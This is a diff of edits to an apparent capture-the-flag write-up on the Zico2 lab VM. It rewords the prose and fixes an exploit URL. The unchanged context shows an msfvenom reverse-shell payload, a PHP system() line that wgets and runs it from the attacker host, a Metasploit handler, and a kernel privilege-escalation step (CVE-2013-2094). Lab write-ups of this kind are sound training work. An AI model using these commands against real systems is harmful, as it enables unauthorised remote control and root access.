@@ -222,7 +222,7 @@ Now that I had achieved Remote Code Execution, I spent a while trying to get a P
 
 After a while, I came to the conclusion that I could use the PHP RCE exploit to get the target to download and execute a binary payload, which I could host on my Kali VM using a simple Python HTTP server. Using Metasploit, I could build a binary payload to preform a reverse TCP connection to establish a remote shell.
 
-So first, the Metasploit payload. I generated this using msfvenom, which is the standalone tool in the Metasploit framework for payload generation.
+First things first, let's create the Metasploit payload. I generated this using msfvenom, which is the standalone tool in the Metasploit framework for payload generation.
 
 ~~~
 ~/b/zico2 # ❯❯❯ msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shell -a x64 --platform linux LHOST=192.168.56.102 LPORT=12345
@@ -239,11 +239,11 @@ Those options mean:
 * `-a x64` - x64 architecture. Despite the payload being for the x64 architecture, msfvenom still needs to know which architecture to build for.
 * `--platform linux` - Build for Linux. Despite the payload being for Linux, msfvenom still needs to know which platform to build for.
 * `LHOST=192.168.56.102` - Set the LHOST variable (the target for the reverse shell to connect to) to my Kali VM's IP address
-* `LPORT=12345` - Connect to a the listener on port 12345
+* `LPORT=12345` - Connect to a listener on port 12345
 
 Next I started an HTTP server in the directory that contained my payload using the Python SimpleHTTPServer module by running `python -m SimpleHTTPServer 8000`.
 
-Then I had to create the PHP script on the target VM to download and execute my payload. The contents of that script was:
+After that, I had to create the PHP script on the target VM to download and execute my payload. The contents of that script was:
 
 ``` php
 <?php system("cd /tmp; wget http://192.168.56.102:8000/shell; chmod a+x shell; ./shell"); ?>
@@ -279,7 +279,7 @@ msf exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 192.168.56.102:12345 
 ~~~
 
-Finally, I browsed to http://192.168.56.101/view.php?page=../../../usr/databases/ and my reverse meterpreter session connected!
+Now that everything was in place, I browsed to http://192.168.56.101/view.php?page=../../../usr/databases/shell.php and my reverse meterpreter session connected!
 
 ~~~
 [*] Started reverse TCP handler on 192.168.56.102:12345 
@@ -288,9 +288,9 @@ Finally, I browsed to http://192.168.56.101/view.php?page=../../../usr/databases
 meterpreter > 
 ~~~
 
-My phpinfo() proof of concept from earlier told me Apache was running as the www-data user, which I assumed was an unprivileged user, so in order to get a root shell, I would need to find a local privilege escalation vulnerability. The phpinfo() proof of concept also disclosed I was looking at an Ubuntu distribution running Linux Kernel version 3.2.0-23. The first Google result for 'linux kernel 3.2.0-23' is an [Exploit DB page](https://www.exploit-db.com/exploits/33589/) with a local privilege escalation exploit, CVE-2013-2094.
+My phpinfo() proof of concept from earlier told me Apache was running as the www-data user, which is an unprivileged user. So in order to get a root shell, I would need to find a local privilege escalation vulnerability. The phpinfo() proof of concept also disclosed I was looking at an Ubuntu distribution running Linux Kernel version 3.2.0-23. The first Google result for 'linux kernel 3.2.0-23' is an [Exploit DB page](https://www.exploit-db.com/exploits/33589/) with a local privilege escalation exploit, CVE-2013-2094.
 
-Having downloaded the C source for the exploit to my Kali VM, I compiled it on my VM, uploaded it to my target using my meterpreter shell, and executed it to get a root shell.
+The ExploitDB page contained the C source for the exploit, which I downloaded to my Kali VM and compiled using GCC. Then I uploaded it to my target using the Meterpreter shell I acquired earlier, and executed it to get a root shell.
 
 ~~~
 >>On Kali VM
